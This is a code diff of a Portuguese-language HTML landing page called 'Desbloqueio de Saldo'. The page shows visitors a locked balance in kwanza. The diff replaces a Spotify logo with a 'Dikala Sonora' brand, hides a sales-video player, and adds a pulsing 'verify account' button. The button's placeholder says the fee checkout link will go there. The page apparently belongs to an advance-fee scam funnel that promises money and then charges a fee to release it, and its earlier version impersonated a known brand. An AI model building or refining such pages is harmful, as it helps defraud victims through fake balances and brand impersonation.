@@ -10,23 +10,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Desbloqueio de Saldo</title>
-    
-    <script
-      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-      data-utmify-prevent-xcod-sck
-      data-utmify-prevent-subids
-      async
-      defer
-    ></script>
-<script>
-  window.pixelId = "6a1aa02138bfbe88dc6754d3";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script>
-    
+
+
+
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
         * {
@@ -67,7 +53,27 @@
         }
 
         .logo {
-            height: 30px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .logo img {
+            height: 70px;
+            width: auto;
+        }
+
+        .logo-text {
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: -1px;
+            color: #121212;
+        }
+
+        .superscript {
+            font-size: 10px;
+            vertical-align: super;
+            color: #888;
         }
 
         .balance-box {
@@ -120,18 +126,51 @@
             overflow: hidden;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
         }
+
+        .btn-verify {
+            background-color: #e60000;
+            color: white;
+            border: none;
+            padding: 20px 30px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(230, 0, 0, 0.3);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.05);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
     </style>
 </head>
 
 <body>
 
     <div class="top-bar">
-        ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.
+        ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU DINHEIRO.
     </div>
 
     <div class="header">
-        <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_Green.png" alt="Spotify"
-            class="logo">
+        <div class="logo">
+            <img src="dikala logo.png" alt="Dikala Sonora">
+            <span class="logo-text">Dikala Sonora<span class="superscript">®</span></span>
+        </div>
         <div class="balance-box">
             <div class="balance-label">Saldo</div>
             <div class="balance-value" id="displayBalance">0,00 Kz</div>
@@ -140,13 +179,18 @@
 
     <div class="content">
         <h1>DESBLOQUEIO DE SALDO</h1>
-        <p>Veja como liberar seu saque assistindo ao vídeo.</p>
+        <p>Clique no botão abaixo e verifique sua conta!</p>
 
-        <div class="video-container">
-            <!-- Vturb Player -->
-            <vturb-smartplayer id="vid-6a0e9934d73d7a412579cea5" style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer>
-            <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/5b6e7aa6-946a-4ac0-8394-9c924b02807e/players/6a0e9934d73d7a412579cea5/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
+        <div class="video-container" style="display: none;">
+            <!-- Vturb Player (Hidden for recording) -->
+            <vturb-smartplayer id="vid-6a0e9934d73d7a412579cea5"
+                style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer>
+            <script
+                type="text/javascript"> var s = document.createElement("script"); s.src = "https://scripts.converteai.net/5b6e7aa6-946a-4ac0-8394-9c924b02807e/players/6a0e9934d73d7a412579cea5/v4/player.js", s.async = !0, document.head.appendChild(s); </script>
         </div>
+
+        <button class="btn-verify" onclick="alert('Aqui você colocará o link do checkout da taxa!')">VERIFICAR
+            CONTA</button>
     </div>
 
     <script>
